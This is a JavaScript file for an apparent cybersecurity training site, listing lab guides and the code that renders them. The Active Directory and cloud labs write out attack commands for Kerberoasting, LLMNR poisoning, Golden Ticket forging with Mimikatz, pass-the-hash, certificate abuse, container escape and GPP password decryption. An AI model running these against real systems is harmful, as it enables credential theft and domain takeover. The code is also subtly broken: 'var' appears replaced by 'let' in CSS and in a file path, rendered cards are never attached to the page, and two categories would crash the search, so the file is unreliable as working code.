                "Verify extracted values against databases of known malicious user agents."
            ],
            commands: "Tshark filter commands:\ntshark -r traffic.pcap -Y \"http.request\" -T fields -e ip.src -e http.user_agent | sort -u",
            mitigation: "Block non-standard user agent strings at the network gateway."
        }
    },
    {
        id: 74,
        title: "Windows Event Log Forensics",
        category: "osint-forensics",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Analyze security event logs in Windows using PowerShell to trace unauthorized login attempts.",
        guide: {
            objective: "Identify unauthorized system access attempts by analyzing Event Logs.",
            labSetup: "A Windows testing system; enable logon auditing.",
            steps: [
                "Open Windows PowerShell with administrative privileges.",
                "Query security logs filtering for logon events (Event ID 4624).",
                "Query logs filtering for failed login events (Event ID 4625).",
                "Extract source IPs and usernames to identify potential attack patterns."
            ],
            commands: "Get failed logins via PowerShell:\nGet-EventLog -LogName Security -InstanceId 4625 | Select-Object TimeGenerated, ReplacementStrings",
            mitigation: "Establish centralized logging systems, and configure alerts to trigger on repeated logon failures."
        }
    },
    {
        id: 75,
        title: "Shodan Queries for ICS Ports",
        category: "osint-forensics",
        difficulty: "intermediate",
        duration: "2-3 Hours",
        xp: 75,
        description: "Use Shodan search queries to identify internet-exposed industrial control system (ICS) ports.",
        guide: {
            objective: "Identify exposed critical infrastructure services by performing Shodan queries.",
            labSetup: "Access to a Shodan account.",
            steps: [
                "Locate common industrial control ports (e.g. Modbus port 502).",
                "Search Shodan using specific filters (e.g. port:502).",
                "Analyze query results to identify host locations and protocols.",
                "Document exposed setups for security auditing."
            ],
            commands: "Shodan query filters:\nport:502 \"product:Modbus\"\nport:47808 \"protocol:bacnet\"",
            mitigation: "Remove critical infrastructure services from direct internet exposure. Enforce VPN authentication."
        }
    },
    {
        id: 76,
        title: "Maltego Graph Reconnaissance",
        category: "osint-forensics",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Perform passive OSINT sweeps in Maltego to map target infrastructure and relationships.",
        guide: {
            objective: "Map relationships between target websites, IP addresses, domains, and personnel.",
            labSetup: "Maltego tool installed locally.",
            steps: [
                "Open Maltego and create a new graph project.",
                "Add a target domain element to the graph.",
                "Run transforms to discover IP addresses, nameservers, and subdomains.",
                "Analyze relationships and export reports."
            ],
            commands: "Launch Maltego:\nmaltego",
            mitigation: "Ensure public infrastructure databases do not expose sensitive corporate records."
        }
    },
    {
        id: 77,
        title: "Autopsy Disk Image Analysis",
        category: "osint-forensics",
        difficulty: "advanced",
        duration: "4-5 Hours",
        xp: 100,
        description: "Perform forensic analysis of disk image files in Autopsy to recover deleted files and inspect registries.",
        guide: {
            objective: "Analyze target disk images to recover data and identify indicators of compromise.",
            labSetup: "Autopsy tool installed; raw disk image file (.img/.dd).",
            steps: [
                "Launch Autopsy and create a new case mapping.",
                "Import the target disk image file as the data source.",
                "Run ingest modules to index files, keywords, and metadata.",
                "Analyze target directories to recover deleted files."
            ],
            commands: "Start Autopsy:\nautopsy",
            mitigation: "Apply full disk encryption policies on all enterprise systems to prevent physical data extractions."
        }
    },
    {
        id: 78,
        title: "Forensics on Browser History",
        category: "osint-forensics",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Recover and analyze SQLite databases of web browser history files from target system folders.",
        guide: {
            objective: "Analyze target user activity by recovering and inspecting browser history databases.",
            labSetup: "System folders containing Google Chrome or Firefox history databases.",
            steps: [
                "Locate the path of browser databases (History SQLite file).",
                "Open database files using DB Browser for SQLite.",
                "Write SQL queries to filter history tables.",
                "Extract visited URLs, timestamps, and search queries."
            ],
            commands: "SQL history query:\nSELECT url, title, datetime(last_visit_time/1000000-11644473600,'unixepoch') FROM urls ORDER BY last_visit_time DESC LIMIT 100;",
            mitigation: "Enforce browser data protection settings, and use secure deletion tools."
        }
    },
    {
        id: 79,
        title: "Phishing Email Code Analysis",
        category: "osint-forensics",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Analyze HTML source code of phishing emails to identify domain aliases and tracker scripts.",
        guide: {
            objective: "Detect malicious links and indicators of compromise inside phishing emails.",
            labSetup: "Raw HTML source code from a test phishing email.",
            steps: [
                "Open the email source code in a text editor.",
                "Inspect anchor tags (href) to check if visible names match target paths.",
                "Identify image links used by attackers for email tracking.",
                "Verify source domains using URL reputation databases."
            ],
            commands: "Inspect links via terminal:\ngrep -o -E 'href=\"[^\"]*\"' email.eml",
            mitigation: "Enforce email protection filters at the gateway, and train users on email verification."
        }
    },
    {
        id: 80,
        title: "JADX Android APK Decompilation",
        category: "osint-forensics",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Decompile Android application packages (APKs) using JADX to analyze source code and find hardcoded keys.",
        guide: {
            objective: "Analyze Android applications to discover logic structures and secret configurations.",
            labSetup: "JADX tool installed locally; target APK file.",
            steps: [
                "Decompile target APK files using JADX.",
                "Browse through source packages and review Java files.",
                "Search code for keywords like secret, key, token, or password.",
                "Verify API endpoints and map network operations."
            ],
            commands: "Decompile APK via CLI:\njadx -d /output/dir/ app.apk",
            mitigation: "Ensure applications use code obfuscation (e.g. ProGuard). Never store secrets or API keys in application source code."
        }
    },
    {
        id: 81,
        title: "GitHub Secret Harvesting Scan",
        category: "osint-forensics",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Scan public GitHub repositories using TruffleHog to detect leaked API keys, tokens, and credentials.",
        guide: {
            objective: "Locate sensitive credentials leaked in public source repositories.",
            labSetup: "TruffleHog tool installed locally; target repository URL.",
            steps: [
                "Install TruffleHog scanner tool.",
                "Run scans targeting specific repository URLs.",
                "Review findings to check for credential patterns.",
                "Implement key rotation strategies for leaked secrets."
            ],
            commands: "Install TruffleHog via pip:\npip install trufflehog\n\nScan public repository:\ntrufflehog git https://github.com/user/repo",
            mitigation: "Deploy pre-commit hooks to scan code files for secrets before pushing changes to remote repositories."
        }
    },
    {
        id: 82,
        title: "Document Metadata Cleanup Tool",
        category: "osint-forensics",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Sanitize public document files using metadata cleanup scripts to prevent information leakage.",
        guide: {
            objective: "Remove author names, system paths, and software details from document files before publication.",
            labSetup: "Python environment; target document files (PDF/DOCX).",
            steps: [
                "Install metadata cleanup packages.",
                "Write scripts that load document files.",
                "Remove metadata variables from target files.",
                "Save modified files and verify metadata is deleted."
            ],
            commands: "Remove PDF metadata via exiftool:\nexiftool -all= document.pdf",
            mitigation: "Enforce automated document sanitization rules inside organizational file upload pipelines."
        }
    },
    {
        id: 83,
        title: "Crypto Wallet Tracker",
        category: "osint-forensics",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Analyze transactions of target cryptocurrency wallets using blockchain explorers to track asset movements.",
        guide: {
            objective: "Map transaction flows and identify destination addresses of target crypto wallets.",
            labSetup: "A target cryptocurrency wallet address.",
            steps: [
                "Open blockchain explorers (e.g., Etherscan, Blockchain.com).",
                "Query target wallet addresses.",
                "Trace transfer history to identify transaction flows.",
                "Identify relationships with exchange platforms."
            ],
            commands: "Query Ethereum balances via curl:\ncurl -s 'https://api.etherscan.io/api?module=account&action=balance&address=[Wallet_Address]'",
            mitigation: "Ensure transactions comply with regulatory audits and address tracking mechanisms."
        }
    },
    {
        id: 84,
        title: "Steganography Hiding & Extractions",
        category: "osint-forensics",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Hide secret messages inside target image files using steghide, and extract them using passphrases.",
        guide: {
            objective: "Establish covert communication channels by hiding messages in image files.",
            labSetup: "Steghide tool installed; target image file; text file containing secret message.",
            steps: [
                "Install steghide packages.",
                "Embed secret messages in image files with passphrase configurations.",
                "Transfer modified image files to destination systems.",
                "Extract hidden messages using decryption keys."
            ],
            commands: "Embed secret message:\nsteghide embed -cf image.jpg -ef secret.txt\n\nExtract hidden message:\nsteghide extract -sf image.jpg",
            mitigation: "Verify file parameters using image analyzers, and scan for abnormalities in image byte structures."
        }
    },

    // Active Directory & Cloud (85-100)
    {
        id: 85,
        title: "Kerberoasting Attack & Mitigations",
        category: "ad-cloud",
        difficulty: "advanced",
        duration: "4 Hours",
        xp: 100,
        description: "Request Service Principal Name (SPN) tickets from Active Directory controllers, export them, and crack passwords offline.",
        guide: {
            objective: "Acquire domain password hashes by querying SPN service setups in Active Directory.",
            labSetup: "Active Directory domain target; domain user account credentials; hashcat tool.",
            steps: [
                "Query domain controllers to find accounts configured with Service Principal Names.",
                "Request TGS ticket variables for target service accounts using PowerShell.",
                "Export ticket hashes to files using Mimikatz or Impacket.",
                "Crack exported hashes offline using dictionary attacks in Hashcat."
            ],
            commands: "Query SPNs via Impacket:\nimpacket-GetUserSPNs [Domain]/[User]:[Password] -request -outputfile krb.hash\n\nCrack hashes in Hashcat:\nhashcat -m 13100 krb.hash wordlist.txt",
            mitigation: "Use long, complex passwords for service accounts. Implement Group Managed Service Accounts (gMSA)."
        }
    },
    {
        id: 86,
        title: "LLMNR Poisoning with Responder",
        category: "ad-cloud",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Capture domain credentials on local networks by poisoning LLMNR and NBT-NS broadcast requests using Responder.",
        guide: {
            objective: "Intercept Active Directory password hashes by poisoning local name resolution queries.",
            labSetup: "Active Directory domain network space; client systems requesting non-existent servers.",
            steps: [
                "Verify active network interfaces on the attacker computer.",
                "Launch Responder specifying target network interfaces.",
                "Trigger failed name queries from client machines (e.g., typing invalid file paths).",
                "Capture NTLM hash outputs from Responder logs."
            ],
            commands: "Launch Responder:\nsudo responder -I eth0 -rdw",
            mitigation: "Disable LLMNR and NBT-NS protocols on all domain systems via Group Policy Objects (GPO)."
        }
    },
    {
        id: 87,
        title: "AWS S3 Bucket Leak Audit",
        category: "ad-cloud",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Scan public AWS S3 buckets to identify open directory settings and download leaked documents.",
        guide: {
            objective: "Discover exposed cloud storage buckets to secure target assets.",
            labSetup: "AWS CLI tools; standard bucket name lists.",
            steps: [
                "Install AWS CLI utilities locally.",
                "Configure dummy credentials to bypass configuration checks.",
                "Scan target bucket paths to discover exposed files.",
                "Query bucket lists to check download permissions."
            ],
            commands: "Query public S3 bucket:\naws s3 ls s3://[Bucket_Name] --no-sign-request\n\nDownload file from public bucket:\naws s3 cp s3://[Bucket_Name]/secret.txt . --no-sign-request",
            mitigation: "Configure AWS S3 bucket blocking rules to prevent public access configurations."
        }
    },
    {
        id: 88,
        title: "Golden Ticket AD Exploit",
        category: "ad-cloud",
        difficulty: "expert",
        duration: "5 Hours",
        xp: 150,
        description: "Extract Active Directory krbtgt account hashes to forge Golden Tickets, gaining persistent domain access.",
        guide: {
            objective: "Forge Ticket Granting Tickets (TGT) to maintain administrative control over Active Directory domains.",
            labSetup: "Active Directory domain space; acquire domain admin privileges on target domain controllers.",
            steps: [
                "Extract krbtgt account hashes using Mimikatz on domain controllers.",
                "Extract the target domain SID value.",
                "Forge custom Golden Tickets using krbtgt hashes and domain SIDs.",
                "Load forged tickets into memory using Kerberos tools and access services."
            ],
            commands: "Dump krbtgt hash via Mimikatz:\nlsadump::lsa /inject /name:krbtgt\n\nForge Golden Ticket:\nkerberos::golden /user:Administrator /domain:[Domain] /sid:[Domain_SID] /krbtgt:[krbtgt_Hash] /ptt",
            mitigation: "Implement strong monitoring around krbtgt account changes. Reset krbtgt account credentials periodically (two-cycle changes)."
        }
    },
    {
        id: 89,
        title: "AWS IAM Privilege Escalation",
        category: "ad-cloud",
        difficulty: "advanced",
        duration: "4 Hours",
        xp: 100,
        description: "Audit AWS IAM users to detect policy misconfigurations that allow self-elevation of account privileges.",
        guide: {
            objective: "Elevate account privileges on AWS by exploiting misconfigured IAM permissions.",
            labSetup: "AWS account setup; IAM user account configured with weak permissions (e.g. CreateNewPolicyVersion).",
            steps: [
                "Inspect user permissions using AWS CLI tools.",
                "Identify misconfigurations (e.g. users allowed to modify policy versions).",
                "Create new policy versions that grant administrative privileges.",
                "Apply the new policy versions to user accounts and verify admin capabilities."
            ],
            commands: "Create administrative policy version:\naws iam create-policy-version --policy-arn [Policy_ARN] --policy-document file://admin-policy.json --set-as-default",
            mitigation: "Implement least privilege models for IAM user policies, and monitor changes to security configurations."
        }
    },
    {
        id: 90,
        title: "BloodHound AD Path Scan",
        category: "ad-cloud",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Use BloodHound and SharpHound to scan Active Directory domains and map attack paths to Domain Admin.",
        guide: {
            objective: "Identify attack paths to Domain Admin inside Active Directory networks.",
            labSetup: "Active Directory domain target; domain user account access.",
            steps: [
                "Run SharpHound gatherers on compromised domain systems.",
                "Export generated directory data zip files to attacker systems.",
                "Import data logs into the BloodHound database portal.",
                "Analyze relationship paths to identify shortcuts to Domain Admin."
            ],
            commands: "Execute SharpHound gatherer:\n.\\SharpHound.exe -c All\n\nLaunch neo4j console:\nsudo neo4j start",
            mitigation: "Audit Active Directory relationship permissions, clean up legacy groups, and restrict administrative access."
        }
    },
    {
        id: 91,
        title: "Pass-the-Hash Credential Abuse",
        category: "ad-cloud",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Access remote systems in Active Directory networks using NTLM password hashes without knowing plain-text passwords.",
        guide: {
            objective: "Access remote target nodes by passing NTLM hashes directly to authentication services.",
            labSetup: "Active Directory domain; target server with shared access credentials; compromised NTLM password hash.",
            steps: [
                "Identify systems on the network running SMB services.",
                "Use Mimikatz to inject NTLM hashes into active memory spaces.",
                "Open elevated terminal commands mapping to target systems.",
                "Access administrative directories on target hosts (e.g., dir \\\\[Target]\\c$)."
            ],
            commands: "Mimikatz Pass-the-Hash execution:\nsekurlsa::pth /user:Administrator /domain:[Domain] /ntlm:[NTLM_Hash] /run:cmd.exe",
            mitigation: "Restrict local administrator accounts from connecting over network interfaces. Implement LAPS configurations."
        }
    },
    {
        id: 92,
        title: "Azure AD Information Disclosure",
        category: "ad-cloud",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Audit Azure AD tenants to identify guest account configurations that expose user directories to external domains.",
        guide: {
            objective: "Identify security configurations that expose Azure AD directories to external users.",
            labSetup: "Azure portal access; guest account login.",
            steps: [
                "Log into Azure portals using guest credentials.",
                "Attempt to search directories to list user records.",
                "Verify if guest user permissions allow listing other account profiles.",
                "Document configuration gaps for security auditing."
            ],
            commands: "List users via Azure CLI:\naz ad user list --query \"[].{name:displayName, mail:mail}\"",
            mitigation: "Configure guest user permissions in Azure AD to restrict directory search access."
        }
    },
    {
        id: 93,
        title: "AWS Network Security Group Audit",
        category: "ad-cloud",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Audit AWS EC2 instances to identify security groups and NACL configurations exposing management ports.",
        guide: {
            objective: "Identify and resolve network access gaps on AWS EC2 configurations.",
            labSetup: "Access to AWS console; EC2 instances running with open security group configurations.",
            steps: [
                "List active AWS security groups using CLI tools.",
                "Identify instances configured with open public access rules (e.g. 0.0.0.0/0).",
                "Locate exposed management ports (e.g., SSH port 22 or RDP port 3389).",
                "Apply restrictive access rules to limit connection sources to specific administrative IPs."
            ],
            commands: "List security groups via CLI:\naws ec2 describe-security-groups --query \"SecurityGroups[*].{Name:GroupName,Rules:IpPermissions}\"",
            mitigation: "Avoid configuring open public access rules for administrative ports. Enforce bastion host connections."
        }
    },
    {
        id: 94,
        title: "AS-REP Roasting Weak Passwords",
        category: "ad-cloud",
        difficulty: "advanced",
        duration: "3-4 Hours",
        xp: 100,
        description: "Identify domain users configured without Kerberos pre-authentication, query their AS-REP hashes, and crack them offline.",
        guide: {
            objective: "Harvest domain password hashes by querying Kerberos pre-authentication settings.",
            labSetup: "Active Directory domain; domain user account access; Hashcat tool.",
            steps: [
                "Scan Active Directory domain accounts to locate users configured with 'Do not require Kerberos preauthentication'.",
                "Query domain controllers to request AS-REP hashes for target accounts.",
                "Export response hashes to local files.",
                "Crack hashes offline using dictionary attacks in Hashcat."
            ],
            commands: "Query AS-REP hashes via Impacket:\nimpacket-GetNPUsers [Domain]/[User] -request -no-pass -format hashcat -outfile asrep.hash\n\nCrack hashes in Hashcat:\nhashcat -m 18200 asrep.hash wordlist.txt",
            mitigation: "Enforce Kerberos pre-authentication across all domain user accounts. Implement strong password policies."
        }
    },
    {
        id: 95,
        title: "Docker Container Escape Audit",
        category: "ad-cloud",
        difficulty: "advanced",
        duration: "4 Hours",
        xp: 100,
        description: "Exploit Docker container configurations like privileged execution modes or writable sockets to escape to host terminals.",
        guide: {
            objective: "Gain command execution access on host systems from inside Docker container environments.",
            labSetup: "A Docker host running container targets configured with privileged access flags.",
            steps: [
                "Verify container privileges by checking for disk devices in dev listings.",
                "Locate the host's root storage directory (e.g. /dev/sda1).",
                "Mount the host disk to a directory inside the container.",
                "Access host storage directories from inside the container to verify escape capabilities."
            ],
            commands: "Mount host drive from container:\nmount /dev/sda1 /mnt\nchroot /mnt /bin/sh",
            mitigation: "Avoid running Docker containers with privileged flags. Secure access to Docker socket files."
        }
    },
    {
        id: 96,
        title: "Kubernetes API Misconfig Audit",
        category: "ad-cloud",
        difficulty: "advanced",
        duration: "4 Hours",
        xp: 100,
        description: "Exploit open Kubernetes API servers with anonymous access enabled to list pods and extract secrets.",
        guide: {
            objective: "Access sensitive cluster data by exploiting misconfigured Kubernetes API servers.",
            labSetup: "Kubernetes cluster setup; API server configured with anonymous access enabled.",
            steps: [
                "Verify API endpoint accessibility using curl requests.",
                "Query pod listings using kubectl tools.",
                "Locate database connection details and secret tokens inside configuration files.",
                "Document vulnerabilities for security auditing."
            ],
            commands: "Query API server via curl:\ncurl -k -s https://[API_Server_IP]:6443/api/v1/namespaces\n\nQuery pods via kubectl:\nkubectl --server=https://[API_Server_IP]:6443 get pods",
            mitigation: "Disable anonymous authorization on Kubernetes API servers. Implement robust Role-Based Access Control (RBAC)."
        }
    },
    {
        id: 97,
        title: "AD CS Certificate Abuse (ESC1)",
        category: "ad-cloud",
        difficulty: "expert",
        duration: "5 Hours",
        xp: 150,
        description: "Exploit Active Directory Certificate Services (AD CS) template misconfigurations (ESC1) to request certificate variables and impersonate admin accounts.",
        guide: {
            objective: "Acquire domain administrative privileges by exploiting vulnerable certificate templates.",
            labSetup: "Active Directory domain with AD CS installed; template configured with CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT permissions.",
            steps: [
                "Scan target domains to locate vulnerable certificate templates.",
                "Request certificates representing target users (e.g. Domain Administrator) using Certify.",
                "Request Kerberos TGT tickets using the certificate credentials.",
                "Access domain controller directories to verify administrative access."
            ],
            commands: "Query templates via Certify:\n.\\Certify.exe find /vulnerable\n\nRequest certificate:\n.\\Certify.exe request /ca:[CA_Name] /template:[Template] /altname:Administrator\n\nRequest TGT:\nRubeus.exe asktgt /user:Administrator /certificate:[Base64_Cert] /ptt",
            mitigation: "Disable template options that allow user-supplied subjects in high-privilege certificate configurations."
        }
    },
    {
        id: 98,
        title: "AWS Lambda Hardcoded Secrets",
        category: "ad-cloud",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Scan AWS Lambda function configurations and code backups to find exposed credentials and hardcoded passwords.",
        guide: {
            objective: "Locate hardcoded API keys and secrets in cloud function files.",
            labSetup: "AWS portal access; Lambda function configurations containing secret environment variables.",
            steps: [
                "Query Lambda functions using AWS CLI tools.",
                "Download Lambda deployment code packages.",
                "Search code files for secret strings.",
                "Retrieve credentials from configuration parameters."
            ],
            commands: "List Lambda functions:\naws lambda list-functions\n\nRetrieve environment variables:\naws lambda get-function --function-name [Function_Name]",
            mitigation: "Avoid hardcoding credentials in Lambda function files; use AWS Secrets Manager or KMS encryption instead."
        }
    },
    {
        id: 99,
        title: "Active Directory GPP Decryption",
        category: "ad-cloud",
        difficulty: "intermediate",
        duration: "2-3 Hours",
        xp: 75,
        description: "Decrypt passwords stored in Active Directory Group Policy Preference files using public AES keys.",
        guide: {
            objective: "Recover plain-text credentials from Active Directory Group Policy files.",
            labSetup: "Domain controller environment; local domain user credentials; GPP configuration XML containing cpassword.",
            steps: [
                "Browse domain controller Sysvol shares to locate Groups Policy XML files.",
                "Locate password parameters (cpassword) in configuration records.",
                "Decrypt the password parameter using the public AES key.",
                "Access target systems using the recovered credentials."
            ],
            commands: "Search GPP XML files:\ngrep -rn \"cpassword\" /let/lib/samba/sysvol/\n\nDecrypt GPP hash:\ngpp-decrypt [cpassword_string]",
            mitigation: "Decommission Group Policy Preferences containing local administrator password mappings (apply MS14-025)."
        }
    },
    {
        id: 100,
        title: "CloudTrail Logs Audit",
        category: "ad-cloud",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Analyze AWS CloudTrail logs using CLI tools to detect indicators of privilege escalation attempts.",
        guide: {
            objective: "Identify privilege escalation attempts inside AWS configurations by analyzing audit logs.",
            labSetup: "Access to AWS console; log directories containing CloudTrail activity records.",
            steps: [
                "Download CloudTrail logs from S3 backup buckets.",
                "Search log events for policy changes (e.g. CreatePolicyVersion, AttachUserPolicy).",
                "Extract user identities and source IPs associated with the event logs.",
                "Document anomalies for security auditing."
            ],
            commands: "Query policy changes via CLI:\naws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=CreatePolicyVersion",
            mitigation: "Enforce real-time alerts on critical IAM modifications using AWS EventBridge and CloudWatch."
        }
    }
,
    // Add New Sessions
    {
        id: 9001,
        title: "Image Steganography Basics 🖼️",
        category: "forensics",
        difficulty: "beginner",
        duration: "1 Hour",
        xp: 40,
        description: "Hide and extract secret text from within an image file.",
        guide: {
            objective: "Learn to mark images with hidden payloads.",
            labSetup: "Any Linux environment with steghide installed.",
            steps: [
                "Install steghide: sudo apt-get install steghide",
                "Hide a message: steghide embed -cf image.jpg -ef secret.txt",
                "Extract it: steghide extract -sf image.jpg"
            ],
            commands: "steghide embed -cf image.jpg -ef secret.txt",
            mitigation: "Monitor file integrity and look for statistical anomalies in image metadata."
        }
    },
    {
        id: 9002,
        title: "Advanced Malware Graph Analysis 📈",
        category: "reverse-engineering",
        difficulty: "advanced",
        duration: "3 Hours",
        xp: 150,
        description: "Use graph theory to map malware execution flow.",
        guide: {
            objective: "Identify malicious patterns using call graphs.",
            labSetup: "Ghidra or IDA Pro.",
            steps: [
                "Load binary into disassembler.",
                "Generate the function call graph.",
                "Identify central execution hubs."
            ],
            commands: "No specific commands, use GUI tools.",
            mitigation: "Code obfuscation (from a defender perspective to slow analysis)."
        }
    },
];

// Elements
const projectsGrid = document.getElementById('projects-grid');
const projectSearchInput = document.getElementById('project-search');
const clearProjSearchBtn = document.getElementById('clear-project-search');
const projectNoResults = document.getElementById('project-no-results');
const projectNoResultsText = document.getElementById('project-no-results-text');
const projResetBtn = document.getElementById('proj-reset-btn');

// Stats Counters
const statTotal = document.getElementById('proj-stat-total');
const statCompleted = document.getElementById('proj-stat-completed');
const statXp = document.getElementById('proj-stat-xp');

// Filter States
let activeProjectCat = 'all';
let activeProjectDiff = 'all';
let activeProjectStatus = 'all';

// Load states from LocalStorage
let completedProjects = JSON.parse(localStorage.getItem('roadmap-completed-projects') || '[]');

// Modal Elements
const projModal = document.getElementById('project-modal');
const modalClose = document.getElementById('modal-close');
const modalCategory = document.getElementById('modal-category');
const modalDifficulty = document.getElementById('modal-difficulty');
const modalTitle = document.getElementById('modal-title');
const modalDuration = document.getElementById('modal-duration');
const modalXp = document.getElementById('modal-xp');
const modalDescription = document.getElementById('modal-description');
const modalObjective = document.getElementById('modal-objective');
const modalSetup = document.getElementById('modal-setup');
const modalStepsList = document.getElementById('modal-steps');
const modalCode = document.getElementById('modal-code');
const modalCopyBtn = document.getElementById('modal-copy-btn');
const modalMitigation = document.getElementById('modal-mitigation');
const modalCompleteCheckbox = document.getElementById('modal-complete-checkbox');

let currentActiveModalProjId = null;

// Category Badge Color Mapping
const categoryLabels = {
    'web-hacking': 'Web Hacking',
    'network-sec': 'Network Security',
    'tool-dev': 'Tool Development',
    'malware-defense': 'Malware & Defense',
    'osint-forensics': 'OSINT & Forensics',
    'ad-cloud': 'Active Directory & Cloud'
};

function renderProjects() {
    if (!projectsGrid) return;
    const query = projectSearchInput.value.trim().toLowerCase();
    projectsGrid.innerHTML = '';
    const fragment = document.createDocumentFragment();
    
    // Toggle clear search button
    if (query.length > 0) {
        clearProjSearchBtn.style.display = 'flex';
    } else {
        clearProjSearchBtn.style.display = 'none';
    }

    let visibleCount = 0;

    projectsData.forEach(proj => {
        const matchesCategory = (activeProjectCat === 'all' || proj.category === activeProjectCat);
        const matchesDifficulty = (activeProjectDiff === 'all' || proj.difficulty === activeProjectDiff);
        const isCompleted = completedProjects.includes(proj.id);
        const matchesStatus = (activeProjectStatus === 'all' ||
                               (activeProjectStatus === 'completed' && isCompleted) ||
                               (activeProjectStatus === 'pending' && !isCompleted));
        
        const titleLower = proj.title.toLowerCase();
        const descLower = proj.description.toLowerCase();
        const catLabel = categoryLabels[proj.category].toLowerCase();
        
        const matchesSearch = titleLower.includes(query) || descLower.includes(query) || catLabel.includes(query);

        if (matchesCategory && matchesDifficulty && matchesStatus && matchesSearch) {
            visibleCount++;
            
            // Simple visual stars representation
            const starStr = '⭐'.repeat(
                proj.difficulty === 'beginner' ? 1 : 
                proj.difficulty === 'intermediate' ? 2 : 
                proj.difficulty === 'advanced' ? 3 : 4
            );

            // Highlight logic
            let highlightedTitle = proj.title;
            let highlightedDesc = proj.description;
            if (query) {
                const escapedQuery = escapeSearchRegex(query);
                const regex = new RegExp(`(${escapedQuery})`, 'gi');
                highlightedTitle = proj.title.replace(regex, '<span class="highlight">$1</span>');
                highlightedDesc = proj.description.replace(regex, '<span class="highlight">$1</span>');
            }

            const card = document.createElement('div');
            card.className = `glass-card project-card proj-cat-${proj.category} ${isCompleted ? 'project-completed-card' : ''}`;
            card.innerHTML = `
                <div class="project-card-header">
                    <span class="channel-badge">${categoryLabels[proj.category]}</span>
                    <span class="project-meta-item" style="color: let(--color-warning);">${starStr}</span>
                </div>
                <h3 class="project-card-title">${highlightedTitle}</h3>
                <p class="project-card-desc">${highlightedDesc}</p>
                <div class="project-card-footer">
                    <div style="display: flex; flex-direction: column; gap: 4px;">
                        <span class="project-meta-item">⏱ ${proj.duration}</span>
                        <span class="project-meta-item" style="color: let(--color-accent); font-weight: bold;">+${proj.xp} XP</span>
                    </div>
                    <div style="display: flex; align-items: center; gap: 10px;">
                        <input type="checkbox" class="skill-checkbox proj-card-cb" data-id="${proj.id}" ${isCompleted ? 'checked' : ''} style="margin: 0; width: 18px; height: 18px; cursor: pointer;">
                        <button class="project-card-btn" data-id="${proj.id}">View Guide</button>
                    </div>
                </div>
            `;
            fragment.appendChild(card);
        }
    });

    // Listeners inside grid
    projectsGrid.querySelectorAll('.project-card-btn').forEach(btn => {
        btn.addEventListener('click', () => {
            const id = parseInt(btn.getAttribute('data-id'));
            openProjectModal(id);
        });
    });

    projectsGrid.querySelectorAll('.proj-card-cb').forEach(cb => {
        cb.addEventListener('change', () => {
            const id = parseInt(cb.getAttribute('data-id'));
            toggleProjectCompletedState(id, cb.checked);
        });
    });

    // Update stats counters
    updateProjectStats();

    // Toggle no results UI
    if (visibleCount === 0) {
        projectNoResults.style.display = 'block';
        projectNoResultsText.textContent = `No project sessions found matching "${projectSearchInput.value}".`;
    } else {
        projectNoResults.style.display = 'none';
    }
}

function updateProjectStats() {
    if (!statTotal) return;
    statTotal.textContent = projectsData.length;
    statCompleted.textContent = `${completedProjects.length} / ${projectsData.length}`;
    
    // Calculate claimed project XP
    let totalProjectXp = 0;
    projectsData.forEach(p => {
        if (completedProjects.includes(p.id)) {
            totalProjectXp += p.xp;
        }
    });
    statXp.textContent = `${totalProjectXp} XP`;
}

function toggleProjectCompletedState(id, checked) {
    const proj = projectsData.find(p => p.id === id);
    if (!proj) return;

    if (checked) {
        if (!completedProjects.includes(id)) {
            completedProjects.push(id);
            addXP(proj.xp);
            playDingSound();
        }
    } else {
        const idx = completedProjects.indexOf(id);
        if (idx !== -1) {
            completedProjects.splice(idx, 1);
            addXP(-proj.xp);
        }
    }
    
    localStorage.setItem('roadmap-completed-projects', JSON.stringify(completedProjects));
    
    // Synchronize UI
    renderProjects();
    updateProjectStats();

    // Sync modal checkbox if open
    if (currentActiveModalProjId === id && modalCompleteCheckbox) {
        modalCompleteCheckbox.checked = checked;
    }
}

// Modal open/close logic
function openProjectModal(id) {
    const proj = projectsData.find(p => p.id === id);
    if (!proj) return;

    currentActiveModalProjId = id;
    
    // Set text contents
    modalCategory.textContent = categoryLabels[proj.category];
    modalDifficulty.textContent = proj.difficulty.toUpperCase();
    modalTitle.textContent = proj.title;
    modalDuration.textContent = `⏱ ${proj.duration}`;
    modalXp.textContent = `+${proj.xp} XP`;
    if (modalDescription) {
        modalDescription.textContent = proj.description;
    }
    modalObjective.textContent = proj.guide.objective;
    modalSetup.textContent = proj.guide.labSetup;
    modalCode.textContent = proj.guide.commands;
    modalMitigation.textContent = proj.guide.mitigation;

    // Steps list rendering
    modalStepsList.innerHTML = '';
    proj.guide.steps.forEach(step => {
        const li = document.createElement('li');
        li.textContent = step;
        modalStepsList.appendChild(li);
    });

    // Checkbox status
    if (modalCompleteCheckbox) {
        modalCompleteCheckbox.checked = completedProjects.includes(id);
    }

    // Reset copy button status
    if (modalCopyBtn) {
        modalCopyBtn.textContent = 'Copy Code';
    }

    // Toggle active state
    if (projModal) {
        projModal.classList.add('active');
        document.body.style.overflow = 'hidden'; // prevent background scrolling
    }
}

function closeProjectModal() {
    if (projModal) {
        projModal.classList.remove('active');
        document.body.style.overflow = '';
        currentActiveModalProjId = null;
    }
}

// Modal Checkbox Click
if (modalCompleteCheckbox) {
    modalCompleteCheckbox.addEventListener('change', () => {
